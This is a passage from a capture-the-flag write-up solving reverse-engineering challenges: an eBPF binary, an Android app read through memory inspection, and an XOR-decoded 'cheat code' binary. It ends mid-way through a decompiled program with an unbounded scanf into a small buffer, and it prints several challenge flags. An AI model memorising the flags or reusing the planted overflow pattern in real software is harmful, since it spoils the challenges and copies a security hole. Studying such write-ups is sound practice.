</span><span id=__span-9-10><a id=__codelineno-9-10 name=__codelineno-9-10 href=#__codelineno-9-10></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;%c&quot;</span><span class=p>,</span><span class=w> </span><span class=n>arr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span><span id=__span-9-11><a id=__codelineno-9-11 name=__codelineno-9-11 href=#__codelineno-9-11></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-9-12><a id=__codelineno-9-12 name=__codelineno-9-12 href=#__codelineno-9-12></a><span class=p>}</span>
</span></code></pre></div> <p>The key string was obtained after i did strings on the ebpf file. That looked sus and it worked out. I am sure it won't be this easy next time. So gotta learn about ebpf.</p> <p>flag: <code>flag{1n7r0_70_3bpf_h3h3h3eh}</code></p> <hr> <h2 id=sl4ydroid>Sl4ydroid<a class=headerlink href=#sl4ydroid title="Permanent link">&para;</a></h2> <p>We were given an android <a href=rev/sl4ydroid/sl4ydroid.apk>app</a> again. This time the app just runs and nothing happens. First I looked at the source code with jadx. The app was loading a custom library.</p> <div class="language-java highlight"><pre><span></span><code><span id=__span-10-1><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>damn</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>);</span>
</span><span id=__span-10-2><a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>
</span><span id=__span-10-3><a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>k2</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>);</span>
</span><span id=__span-10-4><a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a>
</span><span id=__span-10-5><a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>kim</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>);</span>
</span><span id=__span-10-6><a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a>
</span><span id=__span-10-7><a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>nim</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>);</span>
</span><span id=__span-10-8><a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a>
</span><span id=__span-10-9><a id=__codelineno-10-9 name=__codelineno-10-9 href=#__codelineno-10-9></a><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-10><a id=__codelineno-10-10 name=__codelineno-10-10 href=#__codelineno-10-10></a><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&quot;sl4ydroid&quot;</span><span class=p>);</span>
</span><span id=__span-10-11><a id=__codelineno-10-11 name=__codelineno-10-11 href=#__codelineno-10-11></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-10-12><a id=__codelineno-10-12 name=__codelineno-10-12 href=#__codelineno-10-12></a>
</span><span id=__span-10-13><a id=__codelineno-10-13 name=__codelineno-10-13 href=#__codelineno-10-13></a><span class=w>    </span><span class=cm>/* JADX INFO: Access modifiers changed from: protected */</span>
</span><span id=__span-10-14><a id=__codelineno-10-14 name=__codelineno-10-14 href=#__codelineno-10-14></a><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
</span><span id=__span-10-15><a id=__codelineno-10-15 name=__codelineno-10-15 href=#__codelineno-10-15></a><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>savedInstanceState</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-16><a id=__codelineno-10-16 name=__codelineno-10-16 href=#__codelineno-10-16></a><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>savedInstanceState</span><span class=p>);</span>
</span><span id=__span-10-17><a id=__codelineno-10-17 name=__codelineno-10-17 href=#__codelineno-10-17></a><span class=w>        </span><span class=n>setContentView</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>activity_main</span><span class=p>);</span>
</span><span id=__span-10-18><a id=__codelineno-10-18 name=__codelineno-10-18 href=#__codelineno-10-18></a><span class=w>        </span><span class=n>TextView</span><span class=w> </span><span class=n>textView</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>TextView</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>displayTextView</span><span class=p>);</span>
</span><span id=__span-10-19><a id=__codelineno-10-19 name=__codelineno-10-19 href=#__codelineno-10-19></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>displayTextView</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>textView</span><span class=p>;</span>
</span><span id=__span-10-20><a id=__codelineno-10-20 name=__codelineno-10-20 href=#__codelineno-10-20></a><span class=w>        </span><span class=n>textView</span><span class=p>.</span><span class=na>setVisibility</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span><span id=__span-10-21><a id=__codelineno-10-21 name=__codelineno-10-21 href=#__codelineno-10-21></a><span class=w>        </span><span class=n>TextView</span><span class=w> </span><span class=n>textView2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>TextView</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>textView</span><span class=p>);</span>
</span><span id=__span-10-22><a id=__codelineno-10-22 name=__codelineno-10-22 href=#__codelineno-10-22></a><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>textView</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>textView2</span><span class=p>;</span>
</span><span id=__span-10-23><a id=__codelineno-10-23 name=__codelineno-10-23 href=#__codelineno-10-23></a><span class=w>        </span><span class=n>textView2</span><span class=p>.</span><span class=na>setText</span><span class=p>(</span><span class=n>getResources</span><span class=p>().</span><span class=na>getString</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>string</span><span class=p>.</span><span class=na>message</span><span class=p>));</span>
</span><span id=__span-10-24><a id=__codelineno-10-24 name=__codelineno-10-24 href=#__codelineno-10-24></a><span class=w>        </span><span class=n>kim</span><span class=p>(</span><span class=n>getResources</span><span class=p>().</span><span class=na>getString</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>string</span><span class=p>.</span><span class=na>k1</span><span class=p>));</span>
</span><span id=__span-10-25><a id=__codelineno-10-25 name=__codelineno-10-25 href=#__codelineno-10-25></a><span class=w>        </span><span class=n>nim</span><span class=p>(</span><span class=n>getResources</span><span class=p>().</span><span class=na>getString</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>string</span><span class=p>.</span><span class=na>n1</span><span class=p>));</span>
</span><span id=__span-10-26><a id=__codelineno-10-26 name=__codelineno-10-26 href=#__codelineno-10-26></a><span class=w>        </span><span class=n>damn</span><span class=p>(</span><span class=n>getResources</span><span class=p>().</span><span class=na>getString</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>string</span><span class=p>.</span><span class=na>d1</span><span class=p>));</span>
</span><span id=__span-10-27><a id=__codelineno-10-27 name=__codelineno-10-27 href=#__codelineno-10-27></a><span class=w>        </span><span class=n>k2</span><span class=p>(</span><span class=n>getResources</span><span class=p>().</span><span class=na>getString</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>string</span><span class=p>.</span><span class=na>k21</span><span class=p>));</span>
</span><span id=__span-10-28><a id=__codelineno-10-28 name=__codelineno-10-28 href=#__codelineno-10-28></a><span class=w>    </span><span class=p>}</span>
</span></code></pre></div> <p>The app loads the library functions and calls them with the strings defined in the app resource section. The library binary could be found inside <code>resources/lib</code> folder. Upon observing the binary for a long time, it happened to me that we should look at the process memory and look for our flag. I used <a href=https://gameguardian.net/forum/files/ >GameGuardian</a> to check the memory of sl4ydroid process in my android phone which by the way has root enabled. To get the flag, I followed the following process:</p> <p><a class=glightbox href=rev/sl4ydroid/a.png data-type=image data-width=100% data-height=auto data-title=a data-desc-position=bottom><img alt=a src=rev/sl4ydroid/a.png></a> <a class=glightbox href=rev/sl4ydroid/b.png data-type=image data-width=100% data-height=auto data-title=b data-desc-position=bottom><img alt=b src=rev/sl4ydroid/b.png></a> <a class=glightbox href=rev/sl4ydroid/c.png data-type=image data-width=100% data-height=auto data-title=c data-desc-position=bottom><img alt=c src=rev/sl4ydroid/c.png></a> <a class=glightbox href=rev/sl4ydroid/d.png data-type=image data-width=100% data-height=auto data-title=d data-desc-position=bottom><img alt=d src=rev/sl4ydroid/d.png></a> <a class=glightbox href=rev/sl4ydroid/e.png data-type=image data-width=100% data-height=auto data-title=e data-desc-position=bottom><img alt=e src=rev/sl4ydroid/e.png></a> <a class=glightbox href=rev/sl4ydroid/f.png data-type=image data-width=100% data-height=auto data-title=f data-desc-position=bottom><img alt=f src=rev/sl4ydroid/f.png></a> <a class=glightbox href=rev/sl4ydroid/g.png data-type=image data-width=100% data-height=auto data-title=g data-desc-position=bottom><img alt=g src=rev/sl4ydroid/g.png></a> <a class=glightbox href=rev/sl4ydroid/h.png data-type=image data-width=100% data-height=auto data-title=h data-desc-position=bottom><img alt=h src=rev/sl4ydroid/h.png></a> <a class=glightbox href=rev/sl4ydroid/i.png data-type=image data-width=100% data-height=auto data-title=i data-desc-position=bottom><img alt=i src=rev/sl4ydroid/i.png></a> <a class=glightbox href=rev/sl4ydroid/j.png data-type=image data-width=100% data-height=auto data-title=j data-desc-position=bottom><img alt=j src=rev/sl4ydroid/j.png></a> <a class=glightbox href=rev/sl4ydroid/k.png data-type=image data-width=100% data-height=auto data-title=k data-desc-position=bottom><img alt=k src=rev/sl4ydroid/k.png></a> <a class=glightbox href=rev/sl4ydroid/l.png data-type=image data-width=100% data-height=auto data-title=l data-desc-position=bottom><img alt=l src=rev/sl4ydroid/l.png></a></p> <p>flag: <code>flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}</code></p> <hr> <h2 id=cheat-code>Cheat Code<a class=headerlink href=#cheat-code title="Permanent link">&para;</a></h2> <p>We were given a <a href=beginner/cheat_code/intro.out>binary</a> which was very easy to reverse using ghidra. The binary asks for some input (cheat) and then does some xor and conditional check. The conditions were pretty easy to reverse. We also had some part of the flag in plain text. The below c code prints out the flag:</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-11-1><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
</span><span id=__span-11-2><a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>
</span><span id=__span-11-3><a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-11-4><a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>f16</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span><span id=__span-11-5><a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;f&#39;</span><span class=p>;</span>
</span><span id=__span-11-6><a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;l&#39;</span><span class=p>;</span>
</span><span id=__span-11-7><a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;a&#39;</span><span class=p>;</span>
</span><span id=__span-11-8><a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;g&#39;</span><span class=p>;</span>
</span><span id=__span-11-9><a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;{&#39;</span><span class=p>;</span>
</span><span id=__span-11-10><a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;c&#39;</span><span class=p>;</span>
</span><span id=__span-11-11><a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;4&#39;</span><span class=p>;</span>
</span><span id=__span-11-12><a id=__codelineno-11-12 name=__codelineno-11-12 href=#__codelineno-11-12></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;n&#39;</span><span class=p>;</span>
</span><span id=__span-11-13><a id=__codelineno-11-13 name=__codelineno-11-13 href=#__codelineno-11-13></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;\&#39;&#39;</span><span class=p>;</span>
</span><span id=__span-11-14><a id=__codelineno-11-14 name=__codelineno-11-14 href=#__codelineno-11-14></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;t&#39;</span><span class=p>;</span>
</span><span id=__span-11-15><a id=__codelineno-11-15 name=__codelineno-11-15 href=#__codelineno-11-15></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;_&#39;</span><span class=p>;</span>
</span><span id=__span-11-16><a id=__codelineno-11-16 name=__codelineno-11-16 href=#__codelineno-11-16></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;H&#39;</span><span class=p>;</span>
</span><span id=__span-11-17><a id=__codelineno-11-17 name=__codelineno-11-17 href=#__codelineno-11-17></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;E&#39;</span><span class=p>;</span>
</span><span id=__span-11-18><a id=__codelineno-11-18 name=__codelineno-11-18 href=#__codelineno-11-18></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;S&#39;</span><span class=p>;</span>
</span><span id=__span-11-19><a id=__codelineno-11-19 name=__codelineno-11-19 href=#__codelineno-11-19></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;O&#39;</span><span class=p>;</span>
</span><span id=__span-11-20><a id=__codelineno-11-20 name=__codelineno-11-20 href=#__codelineno-11-20></a><span class=w>  </span><span class=n>f16</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=sc>&#39;Y&#39;</span><span class=p>;</span>
</span><span id=__span-11-21><a id=__codelineno-11-21 name=__codelineno-11-21 href=#__codelineno-11-21></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>key</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span><span id=__span-11-22><a id=__codelineno-11-22 name=__codelineno-11-22 href=#__codelineno-11-22></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1b</span><span class=p>;</span>
</span><span id=__span-11-23><a id=__codelineno-11-23 name=__codelineno-11-23 href=#__codelineno-11-23></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x19</span><span class=p>;</span>
</span><span id=__span-11-24><a id=__codelineno-11-24 name=__codelineno-11-24 href=#__codelineno-11-24></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x51</span><span class=p>;</span>
</span><span id=__span-11-25><a id=__codelineno-11-25 name=__codelineno-11-25 href=#__codelineno-11-25></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1e</span><span class=p>;</span>
</span><span id=__span-11-26><a id=__codelineno-11-26 name=__codelineno-11-26 href=#__codelineno-11-26></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x24</span><span class=p>;</span>
</span><span id=__span-11-27><a id=__codelineno-11-27 name=__codelineno-11-27 href=#__codelineno-11-27></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0xd</span><span class=p>;</span>
</span><span id=__span-11-28><a id=__codelineno-11-28 name=__codelineno-11-28 href=#__codelineno-11-28></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-11-29><a id=__codelineno-11-29 name=__codelineno-11-29 href=#__codelineno-11-29></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0xd</span><span class=p>;</span>
</span><span id=__span-11-30><a id=__codelineno-11-30 name=__codelineno-11-30 href=#__codelineno-11-30></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x78</span><span class=p>;</span>
</span><span id=__span-11-31><a id=__codelineno-11-31 name=__codelineno-11-31 href=#__codelineno-11-31></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x41</span><span class=p>;</span>
</span><span id=__span-11-32><a id=__codelineno-11-32 name=__codelineno-11-32 href=#__codelineno-11-32></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x6e</span><span class=p>;</span>
</span><span id=__span-11-33><a id=__codelineno-11-33 name=__codelineno-11-33 href=#__codelineno-11-33></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x20</span><span class=p>;</span>
</span><span id=__span-11-34><a id=__codelineno-11-34 name=__codelineno-11-34 href=#__codelineno-11-34></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x72</span><span class=p>;</span>
</span><span id=__span-11-35><a id=__codelineno-11-35 name=__codelineno-11-35 href=#__codelineno-11-35></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0xc</span><span class=p>;</span>
</span><span id=__span-11-36><a id=__codelineno-11-36 name=__codelineno-11-36 href=#__codelineno-11-36></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=p>;</span>
</span><span id=__span-11-37><a id=__codelineno-11-37 name=__codelineno-11-37 href=#__codelineno-11-37></a><span class=w>  </span><span class=n>key</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x18</span><span class=p>;</span>
</span><span id=__span-11-38><a id=__codelineno-11-38 name=__codelineno-11-38 href=#__codelineno-11-38></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;%s&quot;</span><span class=p>,</span><span class=w> </span><span class=n>f16</span><span class=p>);</span>
</span><span id=__span-11-39><a id=__codelineno-11-39 name=__codelineno-11-39 href=#__codelineno-11-39></a><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>15</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>--</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-11-40><a id=__codelineno-11-40 name=__codelineno-11-40 href=#__codelineno-11-40></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;%c&quot;</span><span class=p>,</span><span class=w> </span><span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>f16</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span><span id=__span-11-41><a id=__codelineno-11-41 name=__codelineno-11-41 href=#__codelineno-11-41></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-11-42><a id=__codelineno-11-42 name=__codelineno-11-42 href=#__codelineno-11-42></a><span class=p>}</span>
</span></code></pre></div> <div class="language-sh highlight"><pre><span></span><code><span id=__span-12-1><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a>backdoor/beg/cheat<span class=w> </span>via<span class=w> </span>C<span class=w> </span>v13.2.1-gcc<span class=w> </span>took<span class=w> </span>1m4s
</span><span id=__span-12-2><a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a>❯<span class=w> </span>./sol
</span><span id=__span-12-3><a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a>flag<span class=o>{</span>c4n<span class=err>&#39;</span>t_HESOYAM_7h15_c4n_y0u<span class=o>}</span>
</span></code></pre></div> <p>flag: <code>flag{c4n't_HESOYAM_7h15_c4n_y0u}</code></p> <hr> <h2 id=marks>Marks<a class=headerlink href=#marks title="Permanent link">&para;</a></h2> <p>We were given a [binary] file that is supposed to show us our marks given our name and roll. Let's load it up in ghidra:</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-13-1><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=n>undefined8</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-13-2><a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a>
</span><span id=__span-13-3><a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a><span class=p>{</span>
</span><span id=__span-13-4><a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>r</span><span class=p>;</span>
</span><span id=__span-13-5><a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=w>  </span><span class=kt>time_t</span><span class=w> </span><span class=n>tVar1</span><span class=p>;</span>
</span><span id=__span-13-6><a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span><span id=__span-13-7><a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a><span class=w>  </span><span class=n>undefined</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span><span id=__span-13-8><a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=w> </span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span><span id=__span-13-9><a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>roll</span><span class=p>;</span>
</span><span id=__span-13-10><a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a><span class=w>  </span><span class=n>uint</span><span class=w> </span><span class=n>m</span><span class=p>;</span>
</span><span id=__span-13-11><a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>local_10</span><span class=p>;</span>
</span><span id=__span-13-12><a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a>
</span><span id=__span-13-13><a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a><span class=w>  </span><span class=n>local_10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>);</span>
</span><span id=__span-13-14><a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a><span class=w>  </span><span class=n>tVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>time</span><span class=p>(</span><span class=mh>0x0</span><span class=p>);</span>
</span><span id=__span-13-15><a id=__codelineno-13-15 name=__codelineno-13-15 href=#__codelineno-13-15></a><span class=w>  </span><span class=n>srand</span><span class=p>(</span><span class=n>tVar1</span><span class=p>);</span>
</span><span id=__span-13-16><a id=__codelineno-13-16 name=__codelineno-13-16 href=#__codelineno-13-16></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Enter your details to view your marks ...&quot;</span><span class=p>);</span>
</span><span id=__span-13-17><a id=__codelineno-13-17 name=__codelineno-13-17 href=#__codelineno-13-17></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Roll Number : &quot;</span><span class=p>);</span>
</span><span id=__span-13-18><a id=__codelineno-13-18 name=__codelineno-13-18 href=#__codelineno-13-18></a><span class=w>  </span><span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&quot;%d&quot;</span><span class=p>,</span><span class=o>&amp;</span><span class=n>roll</span><span class=p>);</span>
</span><span id=__span-13-19><a id=__codelineno-13-19 name=__codelineno-13-19 href=#__codelineno-13-19></a><span class=w>  </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;Name : &quot;</span><span class=p>);</span>
</span><span id=__span-13-20><a id=__codelineno-13-20 name=__codelineno-13-20 href=#__codelineno-13-20></a><span class=w>  </span><span class=n>__isoc99_scanf</span><span class=p>(</span><span class=s>&quot;%s&quot;</span><span class=p>,</span><span class=n>name</span><span class=p>);</span>
</span><span id=__span-13-21><a id=__codelineno-13-21 name=__codelineno-13-21 href=#__codelineno-13-21></a><span class=w>  </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;Please Wait ...</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
</span><span id=__span-13-22><a id=__codelineno-13-22 name=__codelineno-13-22 href=#__codelineno-13-22></a><span class=w>  </span><span class=n>usleep</span><span class=p>(</span><span class=mi>1000000</span><span class=p>);</span>
</span><span id=__span-13-23><a id=__codelineno-13-23 name=__codelineno-13-23 href=#__codelineno-13-23></a><span class=w>  </span><span class=n>r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>rand</span><span class=p>();</span>
